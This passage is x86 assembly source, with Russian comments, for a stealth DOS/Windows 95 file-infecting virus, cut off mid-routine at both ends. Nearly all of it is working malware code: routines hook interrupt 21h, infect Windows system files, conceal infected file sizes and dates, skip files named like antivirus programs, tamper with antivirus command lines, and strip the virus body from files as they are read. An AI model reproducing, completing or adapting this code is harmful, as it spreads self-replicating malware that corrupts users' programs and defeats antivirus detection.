        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    HandleCheck     ; проверка файла IOCTL
        jc      no_seek
        call    Inf_Check       ; инфицирован?
        jnc     no_seek

        call    SaveRegs        ; сохранение регистров
        call    SeekSave        ; сохранение позиции указателя
        mvs     ds,cs           ; DS=CS

        call    crload          ; загрузка оригинального начала в буфер
        call    seek2bof        ; поместить указатель в начало файла
        mov     cx,32           ; запись оригинального заголовка файла
        lea     dx,buffer
        call    write
        xor     cx,ax           ; ошибка? ну тогда при записи того,
        jnz     disfail         ; чего просят ошибка будет тоже!

        mov     cx,-1           ; двигаемся к голове вируса. т.е.
        mov     dx,-vsize       ; к концу зараженной программы
        call    seekfrom_eof
        mov     ah,40h          ; обрезаем файл
        xor     cx,cx           ; удаляем тело вируса из вирусоносителя
        call    int21
        mov     ah,68h          ; сбрасываем буфера
        call    int21
 disfail:
        call    RestoreSeek     ; восстанавление позиции указателя
        call    LoadRegs        ; восстанавление регистров
        jmp     no_seek         ; выходим

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка инфицированности памяти
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 tsrtest:
        mov     ax,3265h        ; Hi, AX=3265
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; повторный перехват вектора int 21h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 rehook:
        call    SaveRegs        ; сохранение регистров
        call    chk_dup         ; проверка, был ли вектор уже
        jnz     no_hook         ; переустановлен
        call    WinOldAp        ; проверка, что-нибудь изменилось с
        cmp     ax,cs:w95state  ; момента инсталляции вируса в память
        jz      no_hook         ; (была ли загружена Win95)

        mov     ax,3521h        ; получение вектора int 21h
        int     21h
        mov     ax,2521h        ; установка нового вектора прерывания
        lea     dx,manager
        mvs     ds,cs
        int     21h
        call    set_dup         ; сохранение вектора в другой ячейке IVT
 no_hook:
        call    LoadRegs        ; восстановление регистров
        jmp     exithandler

; ════════════════════════> S·U·B·R·O·U·T·I·N·E·S <═════════════════════════
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; заражение некоторых жизненно важных файлов
; использует STACKS в качестве буфера для имен файлов
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 FixVirus:
        call    SaveRegs        ; сохранение регистров
        mov     si,2ch
        mov     ds,cs:[si]      ; загрузка сегмента Environment
        xor     si,si
        mvs     es,cs
        lea     di,windir       ; ES:DI -> WINDIR=
 wdlook4:
        call    compare         ; сравнение элеменита envir с шаблоном
        jz      wdfound
        cmp     w [si],0
        jz      fverror
        inc     si
        jmp     wdlook4
 wdfound:
        add     si,11           ; SI -> директория windows
        lea     di,stacks
        lodsb
        stosb
        or      al,al
        jnz     $-4
        mvs     ds,cs
        lea     bx,[di-1]
        lea     si,fixes

 fvinfect:
        cmp     b [si],0
        jz      fverror
        mov     di,bx
        lodsb
        stosb
        or      al,al
        jnz     $-4

        mov     ax,1857h
        lea     dx,stacks
        int     21h
        jmp     fvinfect

 fverror:
        call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Open/Close SFT - подпрограмма для закрытия/открытия нормальной SFT
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 OpenSFT:
        call    SaveRegs        ; сохранение регистров
        mov     si,0            ; "Open"
        jmp     Manipulate

 CloseSFT:
        call    SaveRegs        ; сохранение регистров
        mov     si,1            ; "Close"

 Manipulate:
        mov     bp,bx           ; сохранение handle
        call    HandleCheck     ; проверка, это файл или chardevice
        jc      SFT_Error

        mov     ax,1220h        ; получение JFT для этого файла
        int     2fh
        jc      SFT_Error
        xor     bx,bx
        mov     bl,es:[di]      ; BL = System file entry
        cmp     bl,0ffh
        je      SFT_Error
        mov     ax,1216h        ; получение адреса SFT в ES:DI
        int     2fh
        jc      SFT_Error

        mov     bx,bp           ; восстановление handle
        call    Inf_Check       ; проверка инфицированности файла
        jnc     SFT_Error       ; выход в случае чистого файла

        mov     eax,vsize
        cmp     si,0            ; "Open"?
        jz      open
        neg     eax
 open:  add     es:[di+11h],eax ; сохранение в SFT размера

        mov     dx,es:[di+0fh]  ; получение даты файла
        call    hidestm         ; скрытие лишних 100 лет
        cmp     si,0            ; "Open"?
        jnz     clsft
        ror     dh,1            ; увеличение даты файла
        add     dh,100
        rol     dh,1
 clsft: mov     es:[di+0fh],dx  ; сохранение измененной даты

 SFT_Error:
        call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка активности Win95 (используя WinOldAp)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 WinOldAp:
        mov     ax,1700h        ; функция WinOldAp Installation Check
        int     2fh             ; программа, которая присутствует в Win95
        ret                     ; в 32-разрядном PE режиме

 get_dup:
        push    ds si           ; загрузка регистров ES:BX оригинальным
        mvs     ds,0            ; вектором 21-го прерывания
        mov     si,63h*4
        mov     bx,[si]
        mov     es,[si+2]
        pop     si ds
        ret

 set_dup:
        push    ds si           ; сохранение ES:BX в 63-й векторе
        mvs     ds,0            ; прерывания
        mov     si,63h*4
        mov     [si],bx
        mov     [si+2],es
        pop     si ds
        ret

 chk_dup:
        push    ds si eax       ; проверка изменение 63-го вектора
        mvs     ds,0            ; прерывания
        mov     si,63h*4
        mov     eax,[si]
        cmp     D cs:io21p,eax
        pop     eax si ds
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; size stealth
; ES:SI -> Дата файла
; ES:DI -> Длина файла
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 sizst: mov     dx,es:[si]      ; dx = дата файла
        call    hidestm         ; маскировка и проверка 100 лишних лет
        jnc     oklen           ; файл инфицирован?
        mov     W es:[si],dx    ; установить нормальную дату файла
        sub     W es:[di],vsize ; маскировка приращения длины файла
        sbb     W es:[di+2],0
 oklen: ret

 hidestm:
        push    dx              ; сохранить дату в стеке
        shr     dh,1            ; получить год файла
        cmp     dh,100          ; сравнение его с 100
        pop     dx              ; восстановить дату
        jb      okinf
        ror     dh,1            ; получить год файла
        sub     dh,100          ; спрятать лишнее
        rol     dh,1            ;
        stc                     ; файл заражен!
        ret
 okinf: clc
        ret

 correctdate:
        mov     ax,5700h        ; установка даты файла в зависимости
        call    int21           ; от того, заражен ли он
        call    HideStm         ; нормальная дата
        call    Inf_Check       ; проверить файл на зараженность
        jnc     okdat
        ror     dh,1
        add     dh,100
        rol     dh,1
 okdat: mov     ax,5701h        ; установка откорректированной
        call    int21           ; даты файла
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Проверка имени файла (AVs и цифры)
; Проверка расширения файла (Extens)
; При SAVE_AX=4B00 добавление параметров в cmdline
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Filename:
        call    SaveRegs        ; сохранение регистров
        cld

        mov     si,dx           ; смещение имени в индексный регистр
 nfind: lodsb                   ; поиск имени файла
        cmp     al,':'          ; в нашем случае оно будет следовать
        jz      separ           ; за последним "/", "\", ":"
        cmp     al,'\'
        jz      separ
        cmp     al,'/'
        jnz     store
 separ: mov     dx,si           ; сохранить смещение

 store: or      al,al           ; проверка конца строки (0)
        jnz     nfind

        mov     si,dx           ; SI -> имя файла
        xor     di,di           ; расширение пока не найдено
 gext:  lodsb
        cmp     al,'.'          ; расширение?
        jnz     $+4
        mov     di,si
        or      al,al
        jnz     gext
        or      di,di           ; если точек в имнеи файла
        jz      Bad_File        ; обнаружено не было

        lea     bp,[di-1]       ; сейчас BP-расширение файла, DX-его имя
        mvs     es,cs           ; ES=CS

        cmp     cs:save_ax,4b00h
        jne     no_add
        mov     si,dx           ; SI -> имя файла
        lea     di,prms         ; табличка (формат: avname,0,0,cmdline,0dh)

 scancmd:
        call    compare         ; сравнение имени запускаемой программы
        jz      addprm          ; с предусмотренным именем из таблицы
        mov     al,0dh
        mov     cx,0ffffh
        repne   scasb
        cmp     b cs:[di],0     ; конец таблицы?
        jnz     scancmd         ; в таблице имя не найдено - запущена
        jmp     no_add          ; другая программа

 addprm:
        push    es              ; сохранение ES
        mov     al,0
        mov     cx,0ffffh
        repne   scasb
        lea     si,[di+1]
        les     bx,d cs:save_bx ; загрузка в ES:BX адреса EPB
        les     bx,es:[bx+2]    ; загрузка адреса командной строки в ES:BX
        mov     di,bx
 getdx: inc     di              ; сканируем командную строку
        cmp     b es:[di],0dh   ; конец строки?
        jnz     getdx
        mov     cx,-1           ; счетчик длины дополнительного параметра
        lods    b cs:[si]       ; загрузка байта параметра
        stosb                   ; сохранение байта параметра
        inc     cx              ; увеличение счетчика
        cmp     al,0dh          ; проверка на окончание параметра
        jnz     $-6
        add     es:[bx],cl      ; увеличение длины командной строки
        pop     es              ; восстановление ES

 no_add:
        mov     si,bp
        lea     di,extens       ; ES:DI указывают на таблицу с
        call    compare         ; разрешенными расширениями
        jnz     Bad_File        ; некорректное расширение?

        mov     si,dx           ; SI -> имя файла
        lea     di,AVs          ; ES:DI -> таблица с именами
        call    compare         ; сравнение имен
        jz      Bad_File        ; неХоРошее имя

 digit: lodsb                   ; проверяем, есть ли в имени файла цифры
        cmp     al,'0'
        jb      nodig
        cmp     al,'9'
        jbe     Bad_File
 nodig: or      al,al
        jnz     digit

        call    LoadRegs        ; восстановление регистров
        clc                     ; очистка CF
        ret

 Bad_File:
        call    LoadRegs        ; восстановление регистров
        stc                     ; установка CF
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; установка байта STF в зависимости от текущего PSP/MCB
; байт равен 1 если текущий MCB принадлежит программе из STLOCK
; байт равен 0 если владелец текущего MB не зарегистрирован в STLOCK
; байт COMMAND равен 1 если текущий MB принадлежит command.com'у
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 mcbcheck:
        call    SaveRegs        ; сохранение регистров

        mov     ah,62h          ; запрос сегмента текущего PSP
        call    int21
        dec     bx              ; получение сегмента MCB
        mov     ds,bx           ; DS:SI указывают на владельца MB
        mov     si,08h          ;
        lea     di,stlock       ; ES:DI указывают на наш
        mvs     es,cs           ; список имен STLOCK
        call    compare         ; сравнение данных
        sete    cs:stf          ; установка стелс-флага

        lea     di,comspec      ; проверка владельца текущего
        call    compare         ; блока на command.com
        sete    cs:command
        call    LoadRegs        ; восстановление регистров
        ret                     ; выход из подпрограммы

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; COMPARE - сравнение данных
; DS:SI - источник
; ES:DI - таблица (Data1,0,Data2,0,...,DataN,0,0)
; Выход: ZF = 1 в случае совпадения данных
; Регистр латинских букв значения не имеет
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 compare:
        call    SaveRegs        ; сохранение регистров
        mov     dx,si           ; дублирование смещения источника

 data1: mov     si,dx           ; восстановление смещения источника
 data2: mov     al,ds:[si]      ; чтения байта источника
        mov     ah,es:[di]      ; чтения байта таблицы
        inc     di              ; увеличение индексных регистров
        inc     si              ;
        call    upreg           ; перевод символов в верхний регистр
        or      ah,ah           ; если в таблице образовался 0 =>
        jz      equal           ; => данные совпали
        cmp     al,ah           ; иначе побайтное сравнение
        jz      data2           ; если байты совпали, проверяем дальше

 data3: cmp     B es:[di],0     ; быйты не совпали, берем следующее
        jz      data4           ; поле
        inc     di
        jmp     data3

 data4: inc     di
        cmp     B es:[di],0     ; проверка на последнюю запись в
        jnz     data1           ; таблице

        call    LoadRegs        ; таблица кончилась: совпадений не найдено
        cmp     di,-1           ; очистка ZF
        ret                     ; выход из подпрограммы

 equal: call    LoadRegs        ; восстановление регистров
        cmp     al,al           ; установка ZF
        ret                     ; выход из подпрограммы

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; сохранение и загрузка регистров из стека
; FLAGS EAX BX CX DX SI DI BP ES DS
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 SaveRegs:
        pushf                   ; сохранение самих регистров
        push    eax bx cx dx si di bp es ds
        mov     bp,sp
        push    w [bp+22]       ; копирование адреса возврата
        mov     bp,[bp+4]       ; восстановление BP
        ret

 LoadRegs:
        mov     bp,sp           ; копирование адреса возврата в пустую
        pop     W [bp+24]       ; ячейку стека (осталась от SaveRegs)
        pop     ds es bp di si dx cx bx eax
        popf
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Gets a random value [0..AL]
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 get_rnd:
        push    bx cx dx si di
        mov     si,ax
        mov     ax,cs:random1
        mov     bx,cs:random2
        mov     cx,ax
        mov     di,8405h
        mul     di
        shl     cx,3
        add     ch,cl
        add     dx,cx
        add     dx,bx
        shl     bx,2
        add     dx,bx
        add     dh,bl
        shl     bx,5
        add     dh,bl
        add     ax,1
        adc     dx,0
        mov     cs:random1,ax
        mov     cs:random2,dx
        or      si,si
        jz      rnd_exit

 rnd_fail:
        sub     ax,si
        jnc     rnd_fail
        add     ax,si
        and     eax,0ffffh
 rnd_exit:
        pop     di si dx cx bx
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограммы для установки/снятия вектора прерывания
; критических ошибок int 24h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Hook24:
        call    SaveRegs        ; сохранение и перехват
        xor     ax,ax           ; вектора прерывания критических
        mov     ds,ax           ; ошибок int 24h
        mov     si,24h*4
        mov     dx,cs
        lea     ax,int24
        xchg    ax,[si]
        xchg    dx,[si+2]
        mov     cs:io24,ax
        mov     cs:io24+2,dx
        call    LoadRegs
        ret

 Remove24:
        call    SaveRegs        ; восстановление вектора int 24h
        xor     ax,ax
        mov     ds,ax
        mov     si,24h*4
        mov     ax,cs:io24
        mov     dx,cs:io24+2
        mov     [si],ax
        mov     [si+2],dx
        call    LoadRegs
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограммы для работы с файлами
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 LFNOpenFile:                   ; LFN открытие файла
        mov     ax,716ch
        mov     si,dx
        mov     dx,1            ; открытие файла
        mov     bx,2            ; вернуть ошибку если не открывается
        call    int21
        xchg    ax,bx
        ret

 OpenFile:                      ; открытие файла
        mov     ax,3d02h
        call    int21
        xchg    ax,bx
        ret

 GetDate:                       ; получение времени и даты
        mov     ax,5700h        ; последней записи в файл
        call    int21
        mov     cs:time,cx
        mov     cs:date,dx
        ret

 RestDate:                      ; восстановление времени и даты
        mov     ax,5701h        ; файла
        mov     cx,cs:time
        mov     dx,cs:date
        call    int21
        ret

 Write: mov     ah,40h          ; запись в файл
        call    int21
        ret

 Read:  mov     ah,3fh          ; чтение из файла
        call    int21
        ret

 CloseFile:
        mov     ah,3eh          ; закрытие файла
        call    int21
        ret

 LFNClrAttrib:
        mov     ax,7143h        ; LFN получение и очистка аттрибутов
        mov     bl,0            ; файла
        call    int21
        jc      ClrFailed
        mov     cs:Attrib,cx
        mov     cs:fn_ptr,dx
        mov     cs:fn_ptr+2,ds
        mov     ax,7143h
        mov     bl,1
        xor     cx,cx
        call    int21
        jmp     ClrFailed

 ClrAttrib:
        mov     ax,4300h        ; получение и очистка аттрибутов
        call    int21           ; файла
        jc      ClrFailed       ; также сохранение указателя на файл
        mov     cs:Attrib,cx
        mov     cs:fn_ptr,dx
        mov     cs:fn_ptr+2,ds
        mov     ax,4301h
        xor     cx,cx
        call    int21
 ClrFailed:
        ret

 LFNRestAttrib:
        mov     ax,7143h        ; LFN восстановление аттрибутов
        mov     bl,1            ; файла по сохраненному указателю
        mov     cx,cs:Attrib
        mov     dx,cs:fn_ptr
        mov     ds,cs:fn_ptr+2
        call    int21
        ret
 RestAttrib:
        mov     ax,4301h        ; восстановление аттрибутов
        mov     cx,cs:Attrib    ; файла по сохраненному указателю
        mov     dx,cs:fn_ptr
        mov     ds,cs:fn_ptr+2
        call    int21
        ret

 SeekSave:
        call    SaveRegs        ; сохранение позиции
        xor     cx,cx           ; указателя (lseek) в файле
        xor     dx,dx
        call    seekfrom_cur
        mov     cs:seek_pos,ax
        mov     cs:seek_pos+2,dx
        call    LoadRegs
        ret

 RestoreSeek:
        call    SaveRegs        ; восстановление сохраненной
        mov     dx,cs:seek_pos  ; позиции указателя а файле
        mov     cx,cs:seek_pos+2
        call    seekfrom_bof
        call    LoadRegs
        ret

 seek2bof:
        mov     ax,4200h        ; установка указателя на
        xor     cx,cx           ; начало файла
        xor     dx,dx
        jmp     realseek

 seek2eof:
        mov     ax,4202h        ; установка указателя на
        xor     cx,cx           ; конец файла
        xor     dx,dx
        jmp     realseek

 seekfrom_eof:
        mov     ax,4202h        ; установка указателя
        jmp     realseek        ; от конца файла

 seekfrom_cur:
        mov     ax,4201h        ; установка указателя
        jmp     realseek        ; от текущей позиции

 seekfrom_bof:
        mov     ax,4200h        ; установка указателя
                                ; от начала файла
 realseek:
        call    int21
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; обработчик int 24h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 int24: mov     al,3            ; AL=3:вернуть ошибку
        iret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; псевдо int 21h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 int21: pushf                   ; занос в стек флагов и кодового
        push    cs              ; сегмента
        call    exithandler     ; управление вернется по адресу в стеке
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка файла (дисковый?)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 HandleCheck:
        call    SaveRegs        ; сохранение регистров
        mov     ax,4400h        ; IOCTL: Get device info
        call    int21
        jc      Invalid         ; bad handle?
        test    dl,80h          ; проверка 7-го бита
        jnz     Invalid         ; если 0, то это дисковый файл

        call    LoadRegs        ; восстановление регистров
        clc
        ret

 Invalid:
        call    LoadRegs        ; восстановление регистров
        stc
        ret


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; перевод двух латинских символов в AH и AL в верхний регистр
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 upreg:
        cmp     al,61h          ; 'a'
        jb      badal
        cmp     al,7ah          ; 'z'
        ja      badal
        sub     al,20h          ; 's'->'S'
 badal: cmp     ah,61h          ; 'a'
        jb      badah
        cmp     ah,7ah          ; 'z'
        ja      badah
        sub     ah,20h          ; 's'->'S'
 badah: ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; SeekHide
; если позиция lseek находится на теле вируса, подпрограмма переносит его
; на границу вируса и зараженной программы, т.е. на конец чистой программы
; SEEK_POS содержат новую позицию lseek
; NRBYTES уменьшается на разность двух позиций
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 seekhide:
        call    SaveRegs        ; сохранение регистров
        call    SeekSave        ; сохраняем текущее положение указателя
        mov     cx,-1           ; двигаем указатель на границу вируса и
        mov     dx,-vsize       ; программы
        call    seekfrom_eof    ; DX:AX - голова вируса
        sub     ax,cs:seek_pos  ; SEEK_POS - старая позиция
        sbb     dx,cs:seek_pos+2
        cmp     dx,-1           ; DX:AX должно быть отрицательным
        jnz     not_us
        or      ax,ax
        jns     not_us
        neg     ax              ; получение разности позиций
        sub     cs:nrbytes,ax   ; уменьшение количества прочитанных байтов
        sub     cs:seek_pos,ax  ; уменьшение позиции указателя в файле
        sbb     cs:seek_pos,0   ; т.е. смещение ее на голову вируса
 not_us:
        call    RestoreSeek     ; восстановление позиции указателя
        call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подсчет CRC вируса
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 crc:   push    si cx
        lea     si,shield
        mov     cx,end_crc-shield
        call    crc32
        pop     cx si
        ret

 CRC32: push    ebx ecx edx esi edi ds
        cld
        mov     di,cx
        mov     ecx,-1
        mov     edx,ecx
        mvs     ds,cs

   NextByteCRC:
        xor     eax,eax
        xor     ebx,ebx
        lodsb
        xor     al,cl
        mov     cl,ch
        mov     ch,dl
        mov     dl,dh
        mov     dh,8
   NextBitCRC:
        shr     bx,1
